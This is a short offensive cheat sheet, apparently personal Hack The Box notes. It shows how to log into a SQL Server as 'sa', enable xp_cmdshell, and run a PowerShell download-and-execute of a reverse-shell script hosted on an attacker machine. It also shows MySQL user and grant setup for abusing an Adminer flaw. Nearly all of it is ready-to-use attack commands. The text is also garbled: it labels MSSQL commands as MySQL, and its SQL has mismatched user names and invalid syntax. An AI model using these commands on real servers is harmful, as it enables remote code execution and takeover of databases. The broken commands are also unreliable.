##### MYSQL
```
sqsh -S <ip> -U sa -P <password>
```

Enable xp_cmdshell into RvShell

```
xp_cmdshell 'whoami'
go
EXEC SP_CONFIGURE 'show advanced options', 1
reconfigure
go
EXEC SP_CONFIGURE 'xp_cmdshell', 1
reconfigure
go
xp_cmdshell 'whoami'
go
xp_cmdshell 'powershell "IEX(New-Object Net.WebClient).downloadString(\"http://<ip>:8000/shell.ps1\")"'
go
```

Stuff for adminer.php (Set up user on kali mysql to connect to remote target sql. see https://www.foregenix.com/blog/serious-vulnerability-discovered-in-adminer-tool
```
CREATE DATABASE 'exploitdb';
CREATE USER exploituser@<KALIIP> IDENTIFIED BY 'Target Server';   
GRANT ALL PRIVILEGES ON htb_admirer.* TO exploit@10.10.14.2 WITH GRANT OPTION;
CREATE USER admirer@'%' IDENTIFIED BY 'Target Server';   
GRANT ALL PRIVILEGES ON exploitdb.* TO exploituser@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
use htb_admirer;
CREATE TABLE test( 
  > name  VARCHAR(255),
  > color CHAR(7),
  > PRIMARY KEY (name) 
);
```
